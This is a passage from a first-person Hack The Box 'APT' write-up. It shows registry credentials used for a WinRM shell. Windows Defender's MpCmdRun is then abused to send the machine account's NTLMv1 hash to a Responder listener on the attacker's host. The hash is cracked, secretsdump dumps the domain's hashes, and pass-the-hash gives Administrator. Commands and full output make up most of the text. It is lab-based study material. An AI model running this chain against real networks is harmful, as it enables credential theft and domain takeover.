        USERDOMAIN_ROAMINGPROFILE       REG_SZ   HTB
\Volatile Environment\1\
        SESSIONNAME     REG_SZ   Console
        CLIENTNAME      REG_SZ
```

By the end of the file I'd only found marginally useful info, so I started grepping around to see what I'd overlooked

### Finding user creds

```
\Software\GiganticHostingManagementSystem\
        UserName        REG_SZ   henry.vinson_adm
        PassWord        REG_SZ   G1#Ny5@2dvht
```

Grepping for `Password` surfaced something I'd scrolled straight past the first time: a username and password pair `henry.vinson_adm:G1#Ny5@2dvht`

## Initial Foothold

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ evil-winrm -u henry.vinson_adm -p G1#Ny5@2dvht -i apt.htb.local                                1 ⨯

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== =============================================
htb\henry.vinson_adm S-1-5-21-2993095098-2100462451-206186470-1106

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

After all that effort, I finally landed a shell! There weren't any noteworthy groups or privileges (although being able to add a machine to the domain can be very handy elsewhere; I should have tried it anyway...).

### User.txt

```
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Desktop> ls

    Directory: C:\Users\henry.vinson_adm\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/31/2021   3:46 PM             34 user.txt

*Evil-WinRM* PS C:\Users\henry.vinson_adm\Desktop> type user.txt
0be8************************a6ca
```

The proof I'd gotten in was sitting on the user's Desktop

## Path to Power \(Gaining Administrator Access\)

### Enumeration as `henry.vinson_adm`

None of the winPEAS .exe builds ran on this host, so I fell back to the .bat. I was also blocked from running `systeminfo`

The .bat seemed to hang in a loop, so I opened a second shell and started digging around by hand while it churned

```xml
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Desktop> type C:\Windows\Panther\unattend.xml 
<?xml version='1.0' encoding='utf-8'?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
   <settings pass="generalize" wasPassProcessed="true">
      <component name="Microsoft-Windows-PnpSysprep" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
         <PersistAllDeviceInstalls>true</PersistAllDeviceInstalls>
      </component>
   </settings>
   <settings pass="oobeSystem" wasPassProcessed="true">
      <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
         <OOBE>
            <SkipMachineOOBE>true</SkipMachineOOBE>
            <HideEULAPage>true</HideEULAPage>
            <SkipUserOOBE>true</SkipUserOOBE>
            <ProtectYourPC>1</ProtectYourPC>
         </OOBE>
         <TimeZone>GMT Standard Time</TimeZone>
         <AutoLogon>
            <Enabled>true</Enabled>
            <Username>Administrator</Username>
            <LogonCount>1</LogonCount>
            <Password>*SENSITIVE*DATA*DELETED*</Password>
            <Domain>apt</Domain>
         </AutoLogon>
         <UserAccounts>
            <AdministratorPassword>*SENSITIVE*DATA*DELETED*</AdministratorPassword>
         </UserAccounts>
         <FirstLogonCommands>
            <SynchronousCommand wcm:action="add">
               <CommandLine>net user dsc Password123! /add</CommandLine>
               <Order>1</Order>
            </SynchronousCommand>
            <SynchronousCommand wcm:action="add">
               <CommandLine>net localgroup administrators dsc /add</CommandLine>
               <Order>2</Order>
            </SynchronousCommand>
            <SynchronousCommand wcm:action="add">
               <CommandLine>winrm quickconfig -force</CommandLine>
               <Order>3</Order>
            </SynchronousCommand>
            <SynchronousCommand wcm:action="add">
               <CommandLine>powershell -Command 'Enable-PSRemoting -Force'</CommandLine>
               <Order>4</Order>
            </SynchronousCommand>
            <SynchronousCommand wcm:action="add">
               <CommandLine>powershell -File C:\lcm.ps1</CommandLine>
               <Order>5</Order>
            </SynchronousCommand>
            <SynchronousCommand wcm:action="add">
               <CommandLine>powershell -enc KABHAGUAdAAtAE4AZQB0AEEAZABhAHAAdABlAHIAIAB8ACAARABpAHMAYQBiAGwAZQAtAE4AZQB0AEEAZABhAHAAdABlAHIAQgBpAG4AZABpAG4AZwAgAC0AQwBvAG0AcABvAG4AZQBuAHQASQBEACAAbQBzAF8AdABjAHAAaQBwADYAIAAtAGMAbwBuAGYAaQByAG0AOgAkAGYAYQBsAHMAZQApAA==</CommandLine>
               <Order>6</Order>
            </SynchronousCommand>
         </FirstLogonCommands>
      </component>
   </settings>
   <settings pass="specialize" wasPassProcessed="true">
      <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
         <RegisteredOwner>Administrator</RegisteredOwner>
         <RegisteredOrganization>Managed by Terraform</RegisteredOrganization>
         <ComputerName>apt</ComputerName>
      </component>
      <component name="Microsoft-Windows-TCPIP" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
         <Interfaces>
            <Interface wcm:action="add">
               <Ipv4Settings>
                  <DhcpEnabled>false</DhcpEnabled>
               </Ipv4Settings>
               <UnicastIpAddresses>
                  <IpAddress wcm:action="add" wcm:keyValue="1"><YOUR_IP>/24</IpAddress>
               </UnicastIpAddresses>
               <Ipv6Settings>
                  <DhcpEnabled>true</DhcpEnabled>
               </Ipv6Settings>
               <Identifier>00-50-56-b4-b2-37</Identifier>
               <Routes>
                  <Route wcm:action="add">
                     <Identifier>1</Identifier>
                     <Prefix>0.0.0.0/0</Prefix>
                     <NextHopAddress><YOUR_IP></NextHopAddress>
                  </Route>
               </Routes>
            </Interface>
         </Interfaces>
      </component>
      <component name="Microsoft-Windows-DNS-Client" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
         <Interfaces>
            <Interface wcm:action="add">
               <Identifier>00-50-56-b4-b2-37</Identifier>
               <DNSServerSearchOrder>
                  <IpAddress wcm:action="add" wcm:keyValue="1">127.0.0.1</IpAddress>
               </DNSServerSearchOrder>
            </Interface>
         </Interfaces>
      </component>
      <component name="Microsoft-Windows-Deployment" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
         <RunSynchronous>
            <RunSynchronousCommand wcm:action="add">
               <Path>C:\sysprep\guestcustutil.exe restoreMountedDevices</Path>
               <Order>1</Order>
            </RunSynchronousCommand>
            <RunSynchronousCommand wcm:action="add">
               <Path>C:\sysprep\guestcustutil.exe flagComplete</Path>
               <Order>2</Order>
            </RunSynchronousCommand>
            <RunSynchronousCommand wcm:action="add">
               <Path>C:\sysprep\guestcustutil.exe deleteContainingFolder</Path>
               <Order>3</Order>
            </RunSynchronousCommand>
         </RunSynchronous>
      </component>
   </settings>
</unattend>
```

The output had pointed at a few files of interest. First up was C:\Windows\Panther\unattend.xml. Unattend files frequently leak plaintext credentials, but this admin had been careful enough to strip his out afterward.

```text
(Get-NetAdapter | Disable-NetAdapterBinding -ComponentID ms_tcpip6 -confirm:$false)
```

The base64-encoded command caught my eye. It appeared to be disabling IPv6?

```text
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Desktop> type C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
$Cred = get-credential administrator
invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel -Type DWORD -Value 2 -Force}
```

The PowerShell history file held something noteworthy. The administrator account had been used to run a scriptblock that wrote a value to a registry key

```text
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Desktop> echo $Cred
```

Nope, no luck there. Oh well lol

* [https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level)
* [https://itconnect.uw.edu/wares/msinf/other-help/lmcompatibilitylevel/ntlmv1-removal-known-problems-and-workarounds/](https://itconnect.uw.edu/wares/msinf/other-help/lmcompatibilitylevel/ntlmv1-removal-known-problems-and-workarounds/)
* [https://book.hacktricks.xyz/windows/ntlm](https://book.hacktricks.xyz/windows/ntlm) 

A bit of research turned up that

> The Network security: LAN Manager authentication level setting determines which challenge/response authentication protocol is used for network logons. This choice affects the authentication protocol level that clients use, the session security level that the computers negotiate, and the authentication level that servers accept.

```text
Send NTLM response only | Client devices use NTLMv1 authentication, and they use NTLMv2 session security if the server supports it. Domain controllers accept LM, NTLM, and NTLMv2 authentication. | 2
```

Setting it to '2' meant the host would send NTLM hashes

per [https://book.hacktricks.xyz/windows/ntlm](https://book.hacktricks.xyz/windows/ntlm), I could abuse the print spooler service to coerce the host into sending its hash to me, where `responder` would catch it

```text
┌──(kac0㉿kali)-[~/htb/apt]
└─$ sudo responder -I tun0 --lm           
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.2.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[!] The challenge must be exactly 16 chars long.
Example: 1122334455667788
```

These instructions weren't as clear as some others, but responder's error message was verbose enough to let me sort out the issue

* [https://gbhackers.com/hackers-can-steal-windows-ntlm/](https://gbhackers.com/hackers-can-steal-windows-ntlm/)
* [https://github.com/Gl3bGl4z/All\_NTLM\_leak](https://github.com/Gl3bGl4z/All_NTLM_leak)

That GitHub repo had a solid catalog of NTLM-leak techniques, and I worked through them until one returned a hash that wasn't henry's

> Windows Defender MpCmdRun
>
> `"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe" -Scan -ScanType 3 -File \\Server.domain\file.txt "c:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -DownloadFile -url https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -path \\Server.domain\`

* [https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/command-line-arguments-microsoft-defender-antivirus](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/command-line-arguments-microsoft-defender-antivirus)

> `-Scan [-ScanType [0\|1\|2\|3]] [-File <path> [-DisableRemediation] [-BootSectorScan] [-CpuThrottling]] [-Timeout <days>] [-Cancel]` 
> 
> Scans for malicious software. Values for ScanType are: 0 Default, according to your configuration, -1 Quick scan, -2 Full scan, -3 File and directory custom scan.

scanning a remote share? :\)

```text
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents\test> cd "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\"
Cannot find path 'C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\' because it does not exist.

*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents\test> cd "C:\ProgramData\Microsoft\Windows Defender\platform\"
*Evil-WinRM* PS C:\ProgramData\Microsoft\Windows Defender\platform> ls

    Directory: C:\ProgramData\Microsoft\Windows Defender\platform

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/10/2020  11:09 AM                4.18.2010.7-0
d-----        3/17/2021   3:13 PM                4.18.2102.4-0
```

The path in the example didn't exist, but the `/platform` folder held two newer versions. I was hoping one of them was still affected by this bug

```text
*Evil-WinRM* PS C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0> ./MpCmdRun.exe -Scan -ScanType 3 -file \\10.10.14.187\test
Scan starting...
CmdTool: Failed with hr = 0x80508023. Check C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.log for more information
*Evil-WinRM* PS C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0> type C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.log
-------------------------------------------------------------------------------------

MpCmdRun: Command Line: "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe" -Scan -ScanType 3 -File \\10.10.14.187:8081\file.txt

 Start Time:  Thu  Apr  01  2021 22:25:24

MpEnsureProcessMitigationPolicy: hr = 0x0

Starting RunCommandScan.

INFO: ScheduleJob is not set. Skipping signature update.

Scanning path as file: \\10.10.14.187:8081\file.txt.

Start: MpScan(MP_FEATURE_SUPPORTED, dwOptions=16385, path \\10.10.14.187:8081\file.txt, DisableRemediation = 0, BootSectorScan = 0, Timeout in days = 1)

MpScan() started

Warning: MpScan() encounter errror. hr = 0x80508023

MpScan() was completed

ERROR: MpScan(dwOptions=16385) Completion Failed 80508023

MpCmdRun.exe: hr = 0x80508023.

MpCmdRun: End Time:  Thu  Apr  01  2021 22:25:24

-------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------

MpCmdRun: Command Line: "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe" -h

 Start Time:  Thu  Apr  01  2021 22:28:13

MpEnsureProcessMitigationPolicy: hr = 0x0

MpCmdRun: End Time:  Thu  Apr  01  2021 22:28:13

-------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------

MpCmdRun: Command Line: "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe" -Scan -ScanType 3 -Path \\10.10.14.187\

 Start Time:  Thu  Apr  01  2021 22:28:56

MpEnsureProcessMitigationPolicy: hr = 0x0

Starting RunCommandScan.

MpCmdRun.exe: hr = 0x80070667.

MpCmdRun: End Time:  Thu  Apr  01  2021 22:28:56

-------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------

MpCmdRun: Command Line: "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe" -Scan -ScanType 3 -file \\10.10.14.187\test

 Start Time:  Thu  Apr  01  2021 22:29:07

MpEnsureProcessMitigationPolicy: hr = 0x0

Starting RunCommandScan.

INFO: ScheduleJob is not set. Skipping signature update.

Scanning path as file: \\10.10.14.187\test.

Start: MpScan(MP_FEATURE_SUPPORTED, dwOptions=16385, path \\10.10.14.187\test, DisableRemediation = 0, BootSectorScan = 0, Timeout in days = 1)

MpScan() started

Warning: MpScan() encounter errror. hr = 0x80508023

MpScan() was completed

ERROR: MpScan(dwOptions=16385) Completion Failed 80508023

MpCmdRun.exe: hr = 0x80508023.

MpCmdRun: End Time:  Thu  Apr  01  2021 22:29:11

-------------------------------------------------------------------------------------
```

The scan errored out

```text
┌──(kac0㉿kali)-[~/htb/apt]
└─$ sudo responder -I tun0 --lm           
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.2.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
  
...snipped...

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.187]
    Challenge set              [1122334455667788]
    Don't Respond To Names     ['ISATAP']

[+] Listening for events...
[SMB] NTLMv1 Client   : <YOUR_IP>
[SMB] NTLMv1 Username : HTB\APT$
[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788                                                          
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
```

Even so, my listener caught something! I now had the NTLMv1 hash for the APT$ account

> Remember that the printer will use the computer account during the authentication, and computer accounts use long and random passwords that you probably won't be able to crack using common dictionaries. But the NTLMv1 authentication uses DES \(more info here\), so using some services specially dedicated to cracking DES you will be able to crack it \(you could use [https://crack.sh/](https://crack.sh/) for example\).

So this was the machine account hash...I vaguely recalled reading it wasn't useful, but I went ahead and tried cracking it anyway.

* [https://crack.sh/netntlm/](https://crack.sh/netntlm/)

> There’s a number of articles on the LmCompatibilityLevel setting in Windows, but this will only work if a client has this setting at 2 or lower.

So far so good

* [https://crack.sh/get-cracking/](https://crack.sh/get-cracking/)

```text
NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
```

That's the format crack.sh expects for submission.

I plugged in a disposable email and submitted the hash. Correctly formatted NTLMv1 hashes are cracked for free.

```text
Crack.sh has successfully completed its attack against your NETNTLM handshake. The NT hash for the handshake is included below, and can be plugged back into the 'chapcrack' tool to decrypt a packet capture, or to authenticate to the server:

Token: $NETNTLM$1122334455667788$95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
Key: d167c3238864b12f5f82feae86a7f798

This run took 32 seconds. Thank you for using crack.sh, this concludes your job.
```

Their server emailed me back almost immediately. It only took 32 seconds to look the hash up in the rainbow table. Now I just had to work out how to leverage the machine account hash...

* [http://blog.carnal0wnage.com/2015/09/domain-controller-machine-account-to.html](http://blog.carnal0wnage.com/2015/09/domain-controller-machine-account-to.html)
* [https://winaero.com/beware-microsoft-defender-mpcmdrun-exe-tool-can-be-used-to-download-files/](https://winaero.com/beware-microsoft-defender-mpcmdrun-exe-tool-can-be-used-to-download-files/)

> `python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc LAB/DC2k8_1\$@172.16.102.15`

```text
┌──(kac0㉿kali)-[~/htb/apt]
└─$ python3 /home/kac0/.local/bin/secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798 -just-dc HTB/APT\$@apt.htb.local
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
Administrator:des-cbc-md5:0816d9d052239b8a
krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
krbtgt:des-cbc-md5:f8c26238c2d976bf
henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
henry.vinson:des-cbc-md5:73b6f71cae264fad
henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
APT$:aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
APT$:aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
APT$:des-cbc-md5:76c45245f104a4bf
[*] Cleaning up...
```

Following the blog's template, I dumped the hashes straight off the machine. Far fewer accounts than the backup had! :\)

With the Administrator hash in hand, it was time to crack it!

```text
┌──(kac0㉿kali)-[~/htb/apt]
└─$ hashcat -O -D1,2 -a0 -m1000 admin.hash /usr/share/wordlists/rockyou.txt                      255 ⨯
hashcat (v6.1.1) starting...

...snipped...

Session..........: hashcat                       
Status...........: Exhausted
Hash.Name........: NTLM
Hash.Target......: c370bddf384a691d811ff3495e8a72e2
Time.Started.....: Thu Apr  1 18:11:53 2021 (5 secs)
Time.Estimated...: Thu Apr  1 18:11:58 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2957.7 kH/s (0.60ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 6538/14344385 (0.05%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: $HEX[213134356173382a] -> $HEX[042a0337c2a156616d6f732103]

Started: Thu Apr  1 18:11:51 2021
Stopped: Thu Apr  1 18:11:59 2021
```

rockyou.txt blew through in under 10 seconds, but the password wasn't in it. So I just went with pass-the-hash instead

```text
┌──(kac0㉿kali)-[~/htb/apt]
└─$ evil-winrm -u Administrator -H c370bddf384a691d811ff3495e8a72e2 -i apt.htb.local

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ============================================
htb\administrator S-1-5-21-2993095098-2100462451-206186470-500

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes
========================================== ================ ============================================ ===============================================================
Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
HTB\Domain Admins                          Group            S-1-5-21-2993095098-2100462451-206186470-512 Mandatory group, Enabled by default, Enabled group
HTB\Group Policy Creator Owners            Group            S-1-5-21-2993095098-2100462451-206186470-520 Mandatory group, Enabled by default, Enabled group
HTB\Enterprise Admins                      Group            S-1-5-21-2993095098-2100462451-206186470-519 Mandatory group, Enabled by default, Enabled group
HTB\Schema Admins                          Group            S-1-5-21-2993095098-2100462451-206186470-518 Mandatory group, Enabled by default, Enabled group
HTB\Denied RODC Password Replication Group Alias            S-1-5-21-2993095098-2100462451-206186470-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

*Evil-WinRM* PS C:\Users\Administrator\Documents> $env:username;$env:computername
Administrator
APT
```

Remember to pass `-H` for the hash rather than `-p` for a password!

### Root.txt

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         4/1/2021   9:35 AM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
366c************************bd15
```
